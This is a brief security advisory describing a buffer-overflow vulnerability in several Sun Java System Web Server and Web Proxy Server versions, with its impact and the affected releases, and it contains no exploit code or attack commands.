Sun Java System Web Server is prone to a buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.

Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

The issues affects the following:

Sun Java System Web Server 7.0 without Update Release 8
Sun Java System Web Server 6.1 without Service Pack 12
Sun Java System Web Proxy Server 4.0 without Service pack 13
